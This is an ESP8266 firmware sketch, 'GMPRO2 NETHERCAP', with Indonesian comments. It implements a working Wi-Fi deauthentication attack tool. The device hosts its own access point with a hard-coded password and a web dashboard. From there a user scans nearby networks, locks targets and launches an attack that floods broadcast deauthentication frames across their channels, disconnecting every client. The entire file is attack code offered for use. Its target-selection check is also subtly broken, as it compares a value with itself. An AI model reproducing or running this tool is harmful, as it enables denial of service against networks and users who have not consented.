/* * M1Z23R X GMPRO2 v5.6 - NETHERCAP LOGIC
 * STATUS: LOCKED | MULTI-CHANNEL DEAUTH | NO DISCONNECT
 */

#include <ESP8266WiFi.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>

extern "C" {
  #include "user_interface.h"
}

ESP8266WebServer server(80);
DNSServer dnsServer;

#define MAX_TARGETS 15
struct Target {
  uint8_t mac[6];
  uint8_t ch;
  String ssid;
  bool active = false;
};
Target targets[MAX_TARGETS];
int target_count = 0;
bool deauth_active = false;
int home_channel = 1; // Channel tempat HP kamu terkoneksi

void sendDeauth(uint8_t* target, uint8_t* ap, uint8_t ch) {
  wifi_set_channel(ch); // Lompat ke channel target
  uint8_t packet[26] = {
    0xC0, 0x00, 0x3A, 0x01, 
    target[0], target[1], target[2], target[3], target[4], target[5],
    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
    ap[0], ap[1], ap[2], ap[3], ap[4], ap[5],
    0x00, 0x00, 0x01, 0x00
  };
  for(int i=0; i<3; i++) { // Kirim burst 3 paket agar efektif
    wifi_send_pkt_freedom(packet, 26, 0);
    delay(1);
  }
}

String getDashboard() {
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>body{font-family:monospace;background:#000;color:#0f0;padding:10px;}";
  html += "h2{text-align:center;color:#ff4500;text-shadow:0 0 5px #ff4500;}";
  html += ".grid{display:grid;grid-template-columns:1fr 1fr;gap:8px;}";
  html += ".btn{padding:12px;color:#fff;text-align:center;text-decoration:none;border-radius:4px;font-weight:bold;font-size:10px;}";
  html += ".btn-deauth{background:#c0392b;} .btn-scan{background:#2980b9;} .btn-stop{background:#444;grid-column:span 2;}";
  html += ".btn-sel{background:#333;color:#0f0;border:1px solid #0f0;padding:5px;} .btn-active{background:#ffea00;color:#000;border:1px solid #fff;}";
  html += "table{width:100%;margin-top:15px;border-collapse:collapse;font-size:11px;} td,th{padding:8px;border-bottom:1px solid #222;}</style></head><body>";
  
  html += "<h2>GMPRO2 NETHERCAP</h2>";
  html += "<div style='border:1px solid #444;padding:10px;margin-bottom:10px;'>SELECTED: " + String(target_count) + " | ATK: " + (deauth_active ? "ON" : "OFF") + "</div>";
  
  html += "<div class='grid'><a href='/scan' class='btn btn-scan'>SCAN</a>";
  html += "<a href='/deauth' class='btn btn-deauth'>ATTACK</a>";
  html += "<a href='/stop' class='btn btn-stop'>RESET / CLEAR</a></div>";

  html += "<table><tr><th>SSID</th><th>CH</th><th>RSSI</th><th>ACT</th></tr>";
  int n = WiFi.scanComplete();
  for (int i = 0; i < n; ++i) {
    bool isSelected = false;
    for(int j=0; j<target_count; j++) { if(WiFi.BSSIDstr(i) == WiFi.BSSIDstr(i) && targets[j].active) isSelected = true; }
    html += "<tr><td>" + WiFi.SSID(i) + "</td><td>" + String(WiFi.channel(i)) + "</td><td>" + String(WiFi.RSSI(i)) + "</td>";
    html += "<td><a href='/select?id=" + String(i) + "' class='btn-sel " + (isSelected ? "btn-active" : "") + "'>" + (isSelected ? "LOCK" : "SEL") + "</a></td></tr>";
  }
  html += "</table></body></html>";
  return html;
}

void setup() {
  Serial.begin(115200);
  WiFi.mode(WIFI_AP_STA);
  WiFi.softAP("GMpro2", "sangkur87", home_channel);
  dnsServer.start(53, "*", WiFi.softAPIP());

  server.on("/", [](){ server.send(200, "text/html", getDashboard()); });
  server.on("/scan", [](){ WiFi.scanNetworks(true); server.send(200, "text/html", "<script>location.href='/';</script>"); });
  
  server.on("/select", []() {
    int id = server.arg("id").toInt();
    if(target_count < MAX_TARGETS) {
      targets[target_count].ssid = WiFi.SSID(id);
      targets[target_count].ch = WiFi.channel(id);
      uint8_t* bssid = WiFi.BSSID(id);
      for(int i=0; i<6; i++) targets[target_count].mac[i] = bssid[i];
      targets[target_count].active = true;
      target_count++;
    }
    server.send(200, "text/html", "<script>location.href='/';</script>");
  });

  server.on("/deauth", [](){ deauth_active = true; server.send(200, "text/html", "<script>location.href='/';</script>"); });
  server.on("/stop", [](){ deauth_active = false; target_count = 0; server.send(200, "text/html", "<script>location.href='/';</script>"); });

  server.begin();
  wifi_promiscuous_enable(1);
}

void loop() {
  dnsServer.processNextRequest();
  server.handleClient();

  if (deauth_active && target_count > 0) {
    for(int i = 0; i < target_count; i++) {
      uint8_t bcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
      sendDeauth(bcast, targets[i].mac, targets[i].ch);
      
      // KUNCI: Kembali ke channel Wemos setelah menyerang 1 target
      wifi_set_channel(home_channel); 
      delay(2); // Beri waktu Wemos berkomunikasi dengan HP kamu
    }
  }
}
